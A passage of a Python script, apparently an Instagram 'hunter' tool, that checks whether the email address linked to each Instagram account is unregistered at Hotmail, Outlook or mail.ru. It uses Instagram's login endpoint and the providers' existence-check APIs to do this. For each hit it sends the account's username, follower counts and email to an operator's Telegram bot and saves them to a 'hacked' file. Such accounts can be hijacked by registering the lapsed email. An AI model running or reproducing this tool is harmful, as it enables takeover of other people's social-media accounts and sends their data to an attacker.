        #                url1234 = f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={dani2}'
                #        bne__ = requests.get(url1234)

             #           count+=1
            #            print("--------- TOOL HUNTER V2--------")
                    #    print("MY INSTAGRAM :Danyar.software")
              #          print("MY TELGRAM :Danyarsoftware")
            #            print("\nSTARTED PLEAS WAIT ..")
                        #print("======================================")
          #              print("VAILD :"+str(count))
    #                    print("NOT VAAILD  :"+str(notcount))
                 #       print("NOT BUSSINCE :"+str(nott))
             #           hackedd.write(dani2)
      #              else:
       #                 os.system('cls')
          #              notcount+=1
               #         print("--------- TOOL HUNTER V2--------")
                      #  print("MY INSTAGRAM :Danyar.software")
               #         print("MY TELGRAM :Danyarsoftware")
                #        print("\nSTARTED PLEAS WAIT ..")
                        #print("======================================")
                 #       print("VAILD :"+str(count))
                    #    print("NOT VAAILD  :"+str(notcount))
                   #     print("NOT BUSSINCE :"+str(nott))
                        
                        

            if '@hotmail.com' in xd:
                
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
                day3 = requests.post(url=url_insta,headers=head_insta,data=data_insta).text
               
            
                if '"message":"There was an error with your request. Please try again."' in day3:
                    ur09ll = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + xd + "&_=1604288577990"
                    xud_ = requests.post(url=ur09ll,headers=head_hotmail)
                    
            
                    if 'Neither' in xud_.text:
                        os.system("clear")
                        
                        wana =' <>----------danyar----------<>\nusername :'+awen1+'\nFollowers :'+awen2+'\nFollowing :'+awen3+'\nEmail :'+xd+'\nIsverified :'+awen4+'\n\n--> By:@danyarsoftware'
                        
                        messi = f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={wana}'
                        maryam = requests.get(messi)
                        count+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        hackedd.write(wana)
                        print("NOT BUSSINCE :"+str(nott))
                    else:
                        os.system("cls")
                        notcount+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        print("NOT BUSSINCE :"+str(nott))
                        
                        
            if '@mail.ru' in xd:
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
                day4 = requests.post(url=url_insta,headers=head_insta,data=data_insta).text
                
            
                if '"message":"There was an error with your request. Please try again."' in day4:
        
                    url_mail ='https://account.mail.ru/api/v1/user/exists'
                    data_mail = {
                    
'email':xd
                    }
                    head_mail = {
'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
'contenttype':'application/x-www-form-urlencoded; charset=UTF-8',
                    }
                    beo = requests.post(url=url_mail,headers=head_mail,data=data_mail)
                    
                   
                    if '"exists":false' in beo.text:
                        os.system("clear")
                        wanaaw =' <>----------danyar----------<>\nusername :'+awen1+'\nFollowers :'+awen2+'\nFollowing :'+awen3+'\nEmail :'+xd+'\nIsverified :'+awen4+'\n\n--> By:@danyarsoftware'
                        
                        ronaldo =f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={wanaaw}'
                        marwan = requests.get(ronaldo)
                        count+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        hackedd.write(wanaaw)
                        print("NOT BUSSINCE :"+str(nott))
                    else:
                        os.system("clear")
                        notcount+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        print("NOT BUSSINCE :"+str(nott))
                       
            if '@outlook.com' in xd:
                
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
                day9 = requests.post(url=url_insta,headers=head_insta,data=data_insta).text
               
            
                if '"message":"There was an error with your request. Please try again."' in day9:
                    ur09l = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + xd + "&_=1604288577990"
                    xudd = requests.post(url=ur09l,headers=head_hotmail)
                    
            
                    if 'Neither' in xudd.text:
                        os.system("clear")
                        ani225 =' <>----------danyar----------<>\nusername :'+awen1+'\nFollowers :'+awen2+'\nFollowing :'+awen3+'\nEmail :'+xd+'\nIsverified :'+awen4+'\n\n--> By:@danyarsoftware'
                        
                        send_mno =f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={ani225}'
                        res = requests.get(send_mno)
                        count+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        hackedd.write(ani225)
                        print("NOT BUSSINCE :"+str(nott))
                    else:
                        os.system("clear")
                        notcount+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        print("NOT BUSSINCE :"+str(nott))
                        
            else:
                os.system("clear")
                nott+=1
                print("--------- TOOL HUNTER V2--------")
                print("MY INSTAGRAM :Danyar.software")
                print("MY TELGRAM :Danyarsoftware")
                print("\nSTARTED PLEAS WAIT ..")
                print("======================================")
                print("VAILD :"+str(count))
                print("NOT VAAILD  :"+str(notcount))
                print("NOT BUSSINCE :"+str(nott))



def tel():
	os.system("clear")
	telgramakaw = input("id telgram :")
	tokenakaw = input("token bot :")
	filer = open("telgramId.txt","w")
	filer2 = open("Tokenbot.txt","w")
	filer.write(telgramakaw)
	filer2.write(tokenakaw)
	


def acc():
    os.system('clear')
    print("PLEAS NEW ACCOUNT  FOR LOGIN")
    print('\n\n')
    usero = input("username :")
    passo = input("password :")
    filer = open("login.txt","w")
    filer2 = open("login2.txt",'w')
    filer.write(usero)
    filer2.write(passo)

        
def minu():
    os.system("clear")
    logo = """

:::::::-.    :::.   :::.    :::..-:.     ::-.:::.    :::::::..   
 ;;,   `';,  ;;`;;  `;;;;,  `;;; ';;.   ;;;;';;`;;   ;;;;``;;;;  
 `[[     [[ ,[[ '[[,  [[[[[. '[[   '[[,[[[' ,[[ '[[,  [[[,/[[['  
  $$,    $$c$$$cc$$$c $$$ "Y$c$$     c$$"  c$$$cc$$$c $$$$$$c    
  888_,o8P' 888   888,888    Y88   ,8P"`    888   888,888b "88bo,
  MMMMP"`   YMM   ""` MMM     YM  mM"       YMM   ""` MMMM   "W" 

  ----------------------------<><><>--------------------------

  """
    print(logo)
    print(' [ 1 ] USERNAME BY KEYWORD ')
    print(' [ 2 ] BY USERNAME ')
    print(' [ 3 ] USERNAME BY TOOL (NO NEED USERNAME)')
    print(' [ 4 ] START ')
    print(' [ 5 ] FOR LOGIN ACCOUNT INSTAGRAM ')
    print(" [ 6 ] SAVE AUTO TELGRAM ")
    print(' [ 7 ] EXIT ')
    print("")
    who = int(input("Choice :"))
    if who==1:
        usernamee()
        time.sleep(3)
        minu()
    if who==2:
        userone()
        time.sleep(3)
        minu()
    if who==3:
        os.system('clear')
        nouser()
        minu()
    if who==4:
        cheker()
        minu()
        
    if who==5:
        os.system("clear")
        acc()
        minu()
    if who==6:
    	tel()
    	minu()
    if who==7:
    	exit()
hhhd = {
        
        'User-agent':'Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550'
    }   
def usera():
	global hhd
	fuz = open("user.txt","r").readlines()
	for x in fuz:
		u = x.strip()
		url = 'https://www.instagram.com/web/search/topsearch/?context=blended&query={}&count=500'.format(u)
		get = requests.get(url,headers=hhd)
		g = re.compile(r'"pk":"(.*?)"')
		gs = g.findall(get.text)
		for lord in gs:
			print(lord)
		exit()
		
		
minu()